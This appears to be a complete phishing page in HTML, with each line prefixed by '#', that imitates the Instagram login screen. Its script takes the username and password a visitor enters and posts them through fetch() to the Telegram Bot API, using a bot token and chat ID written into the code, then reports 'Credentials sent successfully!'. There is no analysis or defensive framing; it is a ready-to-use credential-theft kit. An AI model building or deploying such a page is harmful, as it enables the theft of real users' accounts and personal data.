# <!DOCTYPE html>

# <html lang="en">

# <head>

# &nbsp;   <meta charset="UTF-8">

# &nbsp;   <meta name="viewport" content="width=device-width, initial-scale=1.0">

# &nbsp;   <title>Instagram</title>

# &nbsp;   <style>

# &nbsp;       body {

# &nbsp;           background-color: #fafafa;

# &nbsp;           font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;

# &nbsp;           display: flex;

# &nbsp;           justify-content: center;

# &nbsp;           align-items: center;

# &nbsp;           height: 100vh;

# &nbsp;           margin: 0;

# &nbsp;       }

# &nbsp;       .container {

# &nbsp;           display: flex;

# &nbsp;           max-width: 935px;

# &nbsp;           width: 100%;

# &nbsp;           justify-content: space-between;

# &nbsp;           align-items: center;

# &nbsp;       }

# &nbsp;       .phone-mockup {

# &nbsp;           flex: 1;

# &nbsp;           max-width: 454px;

# &nbsp;           margin-right: 32px;

# &nbsp;       }

# &nbsp;       .phone-mockup img {

# &nbsp;           width: 100%;

# &nbsp;           height: auto;

# &nbsp;           border-radius: 20px;

# &nbsp;       }

# &nbsp;       .login-form {

# &nbsp;           flex: 0 0 350px;

# &nbsp;           background: #fff;

# &nbsp;           border: 1px solid #dbdbdb;

# &nbsp;           padding: 40px 40px 20px;

# &nbsp;           text-align: center;

# &nbsp;           border-radius: 8px;

# &nbsp;           box-shadow: 0 2px 8px rgba(0,0,0,0.05);

# &nbsp;       }

# &nbsp;       .logo {

# &nbsp;           width: 120px;

# &nbsp;           margin-bottom: 30px;

# &nbsp;       }

# &nbsp;       input {

# &nbsp;           width: 100%;

# &nbsp;           padding: 10px 8px;

# &nbsp;           margin-bottom: 8px;

# &nbsp;           background: #fafafa;

# &nbsp;           border: 1px solid #dbdbdb;

# &nbsp;           border-radius: 3px;

# &nbsp;           font-size: 14px;

# &nbsp;           box-sizing: border-box;

# &nbsp;       }

# &nbsp;       button {

# &nbsp;           width: 100%;

# &nbsp;           padding: 8px 0;

# &nbsp;           margin: 10px 0 16px;

# &nbsp;           background: #0095f6;

# &nbsp;           color: #fff;

# &nbsp;           border: none;

# &nbsp;           border-radius: 4px;

# &nbsp;           font-weight: bold;

# &nbsp;           cursor: pointer;

# &nbsp;           font-size: 14px;

# &nbsp;           transition: background 0.2s;

# &nbsp;       }

# &nbsp;       button:hover {

# &nbsp;           background: #007ac0;

# &nbsp;       }

# &nbsp;       .divider {

# &nbsp;           display: flex;

# &nbsp;           align-items: center;

# &nbsp;           color: #8e8e8e;

# &nbsp;           font-size: 13px;

# &nbsp;           font-weight: 600;

# &nbsp;           margin: 10px 0 18px;

# &nbsp;       }

# &nbsp;       .divider::before, .divider::after {

# &nbsp;           content: '';

# &nbsp;           flex-grow: 1;

# &nbsp;           height: 1px;

# &nbsp;           background: #dbdbdb;

# &nbsp;           margin: 0 16px;

# &nbsp;       }

# &nbsp;       .facebook-login {

# &nbsp;           color: #385185;

# &nbsp;           font-weight: bold;

# &nbsp;           font-size: 14px;

# &nbsp;           text-decoration: none;

# &nbsp;           display: block;

# &nbsp;           margin-bottom: 20px;

# &nbsp;       }

# &nbsp;       .forgot-password {

# &nbsp;           color: #00376b;

# &nbsp;           font-size: 12px;

# &nbsp;           text-decoration: none;

# &nbsp;           display: block;

# &nbsp;           margin-bottom: 20px;

# &nbsp;       }

# &nbsp;       .signup {

# &nbsp;           font-size: 14px;

# &nbsp;           margin-top: 10px;

# &nbsp;           color: #262626;

# &nbsp;       }

# &nbsp;       .signup a {

# &nbsp;           color: #0095f6;

# &nbsp;           font-weight: bold;

# &nbsp;           text-decoration: none;

# &nbsp;       }

# &nbsp;       @media (max-width: 875px) {

# &nbsp;           .phone-mockup {

# &nbsp;               display: none;

# &nbsp;           }

# &nbsp;           .container {

# &nbsp;               justify-content: center;

# &nbsp;               flex-direction: column;

# &nbsp;               align-items: center;

# &nbsp;           }

# &nbsp;       }

# &nbsp;   </style>

# </head>

# <body>

# &nbsp;   <div class="container">

# &nbsp;       <div class="phone-mockup">

# &nbsp;           <img src="https://www.instagram.com/static/images/homepage/screenshot1.jpg" alt="Phone mockup">

# &nbsp;       </div>

# &nbsp;       <div class="login-form">

# &nbsp;           <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram\_icon.png" alt="Instagram Logo">

# &nbsp;           <form id="loginForm" onsubmit="sendToTelegram(event)">

# &nbsp;               <input type="text" name="username" placeholder="Phone number, username, or email" required>

# &nbsp;               <input type="password" name="password" placeholder="Password" required>

# &nbsp;               <button type="submit">Log in</button>

# &nbsp;           </form>

# &nbsp;           <div class="divider">OR</div>

# &nbsp;           <a href="#" class="facebook-login">Log in with Facebook</a>

# &nbsp;           <a href="#" class="forgot-password">Forgot password?</a>

# &nbsp;           <div class="signup">

# &nbsp;               Don't have an account? <a href="#">Sign up</a>

# &nbsp;           </div>

# &nbsp;       </div>

# &nbsp;   </div>

# 

# &nbsp;   <script>

# &nbsp;       const botToken = "7683849809:AAFdoFVYs2SHFkIloIu5fkMRL56A7zqxiug"; // Replace with your full token

# &nbsp;       const chatId = "7646846586"; // Replace with your full chat ID

# 

# &nbsp;       function sendToTelegram(event) {

# &nbsp;           event.preventDefault(); // Prevent form submission

# 

# &nbsp;           const form = document.getElementById("loginForm");

# &nbsp;           const formData = new FormData(form);

# &nbsp;           const username = formData.get("username");

# &nbsp;           const password = formData.get("password");

# &nbsp;           const message = `Username: ${username}\\nPassword: ${password}`;

# &nbsp;           const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

# 

# &nbsp;           fetch(url, {

# &nbsp;               method: "POST",

# &nbsp;               headers: {

# &nbsp;                   "Content-Type": "application/json",

# &nbsp;               },

# &nbsp;               body: JSON.stringify({

# &nbsp;                   chat\_id: chatId,

# &nbsp;                   text: message,

# &nbsp;               }),

# &nbsp;           })

# &nbsp;           .then(response => {

# &nbsp;               if (!response.ok) {

# &nbsp;                   throw new Error(`HTTP error! status: ${response.status}`);

# &nbsp;               }

# &nbsp;               return response.json();

# &nbsp;           })

# &nbsp;           .then(data => {

# &nbsp;               if (data.ok) {

# &nbsp;                   console.log("Credentials sent to Telegram.");

# &nbsp;                   alert("Credentials sent successfully!");

# &nbsp;                   form.reset(); // Clear form

# &nbsp;               } else {

# &nbsp;                   throw new Error(data.description || "Unknown error");

# &nbsp;               }

# &nbsp;           })

# &nbsp;           .catch(error => {

# &nbsp;               console.error("Error:", error.message);

# &nbsp;               alert("Failed to send credentials. Check console for details.");

# &nbsp;           });

# &nbsp;       }

# &nbsp;   </script>

# </body>

# </html>

